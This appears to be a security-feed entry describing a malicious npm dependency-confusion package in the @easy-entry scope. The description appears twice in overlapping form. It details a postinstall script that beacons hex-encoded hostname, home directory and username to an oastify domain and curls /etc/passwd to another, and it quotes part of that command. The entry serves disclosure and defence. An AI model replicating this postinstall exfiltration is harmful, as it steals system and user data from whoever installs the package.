details: A dependency-confusion stub in the @easy-entry scope (version 99.9.5, 588-byte tarball, no real code) with a two-stage postinstall exfiltration payload: scripts/scream3gg.js collects os.hostname(), os.homedir(), and os.userInfo().username, hex-encodes them, and beacons via fetch to nmd25sur8sjp60lm75dp67e2gtmkaayz[.]oastify[.]com; then curl --data '@/etc/passwd' exfiltrates /etc/passwd to $(hostname).200hj786m7x4kfz1lkr4kmshu80zoqcf[.]oastify[.]com. A @easy-entry-scoped data-theft dropper (version 99.9.5, two files, 588-byte tarball, no real functionality). Its postinstall runs scream3gg.js, which exfiltrates hex-encoded hostname/homedir/username via fetch to an oastify[.]com subdomain, then curls /etc/passwd to a separate oastify[.]com subdomain.
